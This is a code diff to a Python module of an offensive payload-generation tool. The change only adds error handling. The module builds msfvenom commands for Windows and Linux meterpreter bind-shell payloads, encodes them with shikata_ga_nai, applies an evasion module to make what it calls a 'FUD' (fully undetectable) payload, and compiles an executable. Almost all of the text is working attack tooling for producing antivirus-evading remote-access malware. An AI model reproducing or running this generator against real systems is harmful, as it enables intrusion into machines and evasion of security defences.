@@ -23,32 +23,38 @@ class Payload(controller.Module):
 	exec_name = controller.Options('evil', "Nmae of executable file in source code")
 
 	def run(self):
-	# try
-		utils.printf("Generating options", 'warn')
-		generate = {
-			'windows': {
-				'x86': 'msfvenom -p windows/meterpreter/bind_tcp -a {} '.format(self.architecture),
-				'x64': 'msfvenom -p windows/x64/meterpreter/bind_tcp -a {} '.format(self.architecture)
-			},
-			'linux': 'msfvenom -p linux/{}/meterpreter/bind_tcp -a '.format(self.architecture, self.architecture)
-		}
-		randiter = str(random.randint(10, 15))
-		generate = generate[self.platform][self.architecture] + 'lport={} '.format(self.lport)
-		generate += '--smallest -e x86/shikata_ga_nai -f c -b "\\x00\\x0a\\x0d" -i {} '.format(randiter)
-		src_output = 'output/meterpreter_bind.c'
-		generate += '-o {} --platform {}'.format(src_output, self.platform)
-		utils.printf("Generating payload", 'warn')
-		os.popen(generate)
-		utils.printf("Output source generated at {}".format(src_output), 'good')
-		# except:
+		try:
+			utils.printf("Generating options", 'warn')
+			generate = {
+				'windows': {
+					'x86': 'msfvenom -p windows/meterpreter/bind_tcp -a {} '.format(self.architecture),
+					'x64': 'msfvenom -p windows/x64/meterpreter/bind_tcp -a {} '.format(self.architecture)
+				},
+				'linux': 'msfvenom -p linux/{}/meterpreter/bind_tcp -a '.format(self.architecture, self.architecture)
+			}
+			randiter = str(random.randint(10, 15))
+			generate = generate[self.platform][self.architecture] + 'lport={} '.format(self.lport)
+			generate += '--smallest -e x86/shikata_ga_nai -f c -b "\\x00\\x0a\\x0d" -i {} '.format(randiter)
+			src_output = 'output/meterpreter_bind.c'
+			generate += '-o {} --platform {}'.format(src_output, self.platform)
+			utils.printf("Generating payload", 'warn')
+			os.popen(generate)
+			utils.printf("Output source generated at {}".format(src_output), 'good')
+		except:
+			utils.printf("Error while generating payload", 'bad')
+			return ''
 		utils.printf("Generating FUD payload", 'warn')
-		data = actions.getout(src_output)
-		evade_method = "{}_mathinject_{}".format(self.evasion_method, self.platform)
-		evade_tech = importlib.import_module('evasion.{}'.format(self.evasion_tech))
-		evade_run = getattr(evade_tech, evade_method)(data, self.exec_name)
-		data = evade_run.run()
-		actions.writeout(data, src_output)
-		utils.printf("Generating FUD completed", 'good')
+		try:
+			data = actions.getout(src_output)
+			evade_method = "{}_mathinject_{}".format(self.evasion_method, self.platform)
+			evade_tech = importlib.import_module('evasion.{}'.format(self.evasion_tech))
+			evade_run = getattr(evade_tech, evade_method)(data, self.exec_name)
+			data = evade_run.run()
+			actions.writeout(data, src_output)
+			utils.printf("Generating FUD completed", 'good')
+		except:
+			utils.printf("Error while generating FUD payload", 'bad')
+			return ''
 		utils.printf("Building executable file", 'warn')
 		actions.build_exec(self.platform, self.architecture, src_output, 'output/')
 		utils.printf("Build completed", 'good')
